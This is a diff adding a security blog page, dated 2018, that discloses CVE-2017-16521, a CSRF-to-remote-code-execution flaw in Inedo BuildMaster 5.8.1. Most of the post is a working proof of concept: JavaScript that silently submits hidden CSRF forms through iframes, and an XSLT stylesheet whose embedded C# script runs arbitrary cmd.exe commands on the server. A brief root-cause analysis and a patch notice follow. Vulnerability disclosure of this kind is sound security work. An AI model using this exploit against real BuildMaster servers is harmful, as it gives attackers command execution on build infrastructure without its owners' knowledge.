@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.40.3" />
+
+  <title>BuildMaster Configuration File Template XSLT RCE &middot; Application Security Blog</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+ 
+  
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/androidstudio.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/powershell.min.js"></script>
+  
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon" />
+
+  
+  
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+  <a class="pure-menu-heading brand" href="/">James Otten</a>
+
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="mailto:info@jamesotten.com"><i class='fa fa-envelope fa-fw'></i>Contact</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/james-otten" target="_blank"><i class="fa fa-github-square fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+
+  <div>
+  <div class="small-print">
+    <small>&copy; 2018 James Otten. &nbsp;All rights reserved.</small>
+  </div>
+  <div class="small-print">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>BuildMaster Configuration File Template XSLT RCE</h1>
+  <h2></h2>
+</div>
+<div class="content">
+
+  <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>14 May 2018</time>
+  </div>
+
+  
+
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-tags fa-fw"></i>
+    
+      <a class="post-taxonomy-tag" href="/tags/rce">RCE</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="/tags/xslt">XSLT</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="/tags/csrf">CSRF</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="/tags/cve">CVE</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="/tags/buildmaster">BuildMaster</a>
+    
+  </div>
+  
+  
+
+</div>
+
+  <p>In October of 2017 I discovered a vulnerability in <a href="https://inedo.com/buildmaster">Inedo BuildMaster</a> 5.8.1 related to the use of <a href="https://inedo.com/support/documentation/buildmaster/modeling-applications/configuration-files">configuration file templates</a> which allowed for RCE. This vulnerability could be exploited by an authenticated user directly, or by exploiting multiple CSRF vulnerabilities without the user&rsquo;s knowledge in some cases.
+</p>
+
+<h2 id="poc">PoC</h2>
+
+<p>This is one of my favorite PoCs due to the number of languages used.</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;!-- James Otten 2017 --&gt;
+&lt;body&gt;
+&lt;script src=&quot;https://code.jquery.com/jquery-3.2.1.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;
+
+function createIframe(html) {
+    $('body').append('&lt;iframe src=&quot;data:text/html,&lt;html&gt;' + encodeURIComponent(html) + '&lt;/html&gt;&quot;&gt;&lt;/iframe&gt;');
+}
+
+function editConfigFile(baseUrl, configurationFileId, instance, template) {
+    var url = baseUrl + &quot;/0x44/BuildMaster.Web.WebApplication/Inedo.BuildMaster.Web.WebApplication.Pages.Applications.Configuration.EditConfigurationFilePage/SaveConfigFile&quot;;
+
+    var html = basePage;
+    html += '&lt;form id=&quot;csrf&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;POST&quot; action=&quot;' + url + '&quot;&gt;';
+    html += '&lt;input type=&quot;text&quot; value=&quot;' + configurationFileId + '&quot; name=&quot;configFileId&quot;&gt;';
+    html += '&lt;input type=&quot;text&quot; value=&quot;RCE&quot; name=&quot;notes&quot;&gt;';
+    html += '&lt;input type=&quot;text&quot; value=&quot;&quot; name=&quot;releases&quot;&gt;';
+    html += '&lt;input type=&quot;text&quot; value=&quot;' + instance + '&quot; name=&quot;i_Integration&quot;&gt;';
+    html += &quot;&lt;input type='text' value='&quot; + template + &quot;' name='i_Template'&gt;&quot;;
+    html += '&lt;/form&gt;';
+
+    createIframe(html);
+}
+
+function previewTransform(baseUrl, configurationFileId, serverId, versionNumber) {
+    var url = baseUrl + &quot;/0x44/BuildMaster.Web.WebApplication/Inedo.BuildMaster.Web.WebApplication.Pages.Applications.Configuration.DeployConfigurationFilePage/PreviewConfigFile&quot;;
+
+    var html = basePage;
+    html += '&lt;form id=&quot;csrf&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;POST&quot; action=&quot;' + url + '&quot;&gt;';
+    html += '&lt;input type=&quot;text&quot; value=&quot;' + configurationFileId + '&quot; name=&quot;configFileId&quot;&gt;';
+    html += '&lt;input type=&quot;text&quot; value=&quot;Integration&quot; name=&quot;instanceName&quot;&gt;';
+    html += '&lt;input type=&quot;text&quot; value=&quot;' + serverId + '&quot; name=&quot;serverId&quot;&gt;';
+    html += '&lt;input type=&quot;text&quot; value=&quot;' + versionNumber + '&quot; name=&quot;versionNumber&quot;&gt;';
+    html += '&lt;/form&gt;';
+
+    createIframe(html);
+}
+
+var basePage = '&lt;script&gt;document.addEventListener(&quot;DOMContentLoaded&quot;, function() { document.forms[&quot;csrf&quot;].submit(); });&lt;/s' + 'cript&gt;';
+
+function exploit() {
+    var configurationFileId = $('#configurationFileId').val();
+    var baseUrl = $('#baseUrl').val();
+    var serverId = $('#serverId').val();
+    var versionNumber = $('#versionNumber').val();
+    var instanceXml = $('#xml').val();
+    var xsl = $('#xsl').val();
+
+    editConfigFile(baseUrl, configurationFileId, instanceXml, xsl);
+
+    setTimeout(function() {
+        previewTransform(baseUrl, configurationFileId, serverId, versionNumber);
+    }, 5000);
+}
+
+&lt;/script&gt;
+
+&lt;h2&gt;BuildMaster CSRF -&gt; RCE&lt;h2&gt;
+&lt;p&gt;Tested on version 5.8.1 (Build 5)&lt;/p&gt;
+&lt;table&gt;
+&lt;tr&gt;&lt;td&gt;Base url of BuildMaster instance&lt;/td&gt;&lt;td&gt;&lt;input id=&quot;baseUrl&quot; value=&quot;http://127.0.0.1:82&quot; /&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;configurationFileId&lt;/td&gt;&lt;td&gt;&lt;input id=&quot;configurationFileId&quot; value=&quot;19&quot; /&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;serverId&lt;/td&gt;&lt;td&gt;&lt;input id=&quot;serverId&quot; value=&quot;135&quot; /&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;versionNumber&lt;/td&gt;&lt;td&gt;&lt;input id=&quot;versionNumber&quot; value=&quot;1&quot; /&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;xml&lt;/td&gt;&lt;td&gt;&lt;textarea id=&quot;xml&quot; rows=&quot;7&quot; cols=&quot;80&quot;&gt;
+&lt;?xml version='1.0'?&gt;
+&lt;data&gt;
+ &lt;commands&gt;
+  &lt;command&gt;whoami&lt;/command&gt;
+ &lt;/commands&gt;
+&lt;/data&gt;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;xsl&lt;/td&gt;&lt;td&gt;&lt;textarea id=&quot;xsl&quot; rows=&quot;30&quot; cols=&quot;80&quot;/&gt;
+&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+    xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;
+    xmlns:user=&quot;urn:my-scripts&quot;&gt;
+
+&lt;msxsl:script language = &quot;C#&quot; implements-prefix = &quot;user&quot;&gt;
+&lt;![CDATA[
+public string execute(string command){
+    System.Diagnostics.Process proc = new System.Diagnostics.Process();
+    proc.StartInfo.FileName= &quot;C:\\windows\\system32\\cmd.exe&quot;;
+    proc.StartInfo.RedirectStandardOutput = true;
+    proc.StartInfo.UseShellExecute = false;
+    proc.StartInfo.Arguments = &quot;/c &quot; + command;
+    proc.Start();
+    return proc.StandardOutput.ReadToEnd();
+}
+]]&gt;
+&lt;/msxsl:script&gt;
+&lt;xsl:template match=&quot;data&quot;&gt;
+ &lt;outputs&gt;
+  &lt;xsl:for-each select=&quot;commands&quot;&gt;
+   &lt;output&gt;
+    &lt;xsl:copy-of select=&quot;node()&quot;/&gt;
+    &lt;value&gt;&lt;xsl:value-of select=&quot;user:execute(command)&quot;/&gt;&lt;/value&gt;
+   &lt;/output&gt;
+  &lt;/xsl:for-each&gt;
+ &lt;/outputs&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;button onclick=&quot;exploit()&quot;&gt;exploit&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<h2 id="analysis">Analysis</h2>
+
+<p>The root cause of this vulnerability is the use of an unsafe XSLT processor with user controlled XSLT. The XSLT processor in use by the application was <a href="https://msdn.microsoft.com/en-us/library/system.xml.xsl.xsltransform(v=vs.110).aspx">System.Xml.Xsl.XslTransform</a> which, among other things, allows for the execution of arbitrary code through <a href="https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script">msxsl:script</a>.</p>
+
+<p>As a developer using XSLT, it is very important to learn about the capabilities of your XSLT processor to make sure your processor of choice fits your use case and security model. I also suggest trying to avoid executing user controlled XSLT if possible as it is very easy to misconfigure a XSLT processor to allow for arbitrary file reads, SSRF, or even RCE.</p>
+
+<h2 id="mitigation">Mitigation</h2>
+
+<p>Updating to BuildMaster 5.8.2+ will prevent attackers from exploiting this vulnerability.</p>
+
+<h2 id="more-information">More information</h2>
+
+<ul>
+<li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16521">CVE-2017-16521</a></li>
+<li><a href="https://inedo.myjetbrains.com/youtrack/issue/BM-3108">BM-3108</a></li>
+</ul>
+
+  
+<div class="prev-next-post pure-g">
+  <div class="pure-u-1-24" style="text-align: left;">
+    
+    <a href="/post/buildmaster-event-listener-rce/"><i class="fa fa-chevron-left"></i></a>
+    
+  </div>
+  <div class="pure-u-10-24">
+    
+    <nav class="prev">
+      <a href="/post/buildmaster-event-listener-rce/">BuildMaster Event Listener RCE</a>
+    </nav>
+    
+  </div>
+  <div class="pure-u-2-24">
+    &nbsp;
+  </div>
+  <div class="pure-u-10-24">
+    
+  </div>
+  <div class="pure-u-1-24" style="text-align: right;">
+    
+  </div>
+</div>
+
+
+
+  
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    
+    
+    if (window.location.hostname == "localhost")
+        return;
+
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'jamesotten';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+</div>
+
+</div>
+</div>
+<script src="/js/ui.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-119250474-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+
+
+</body>
+</html>
+
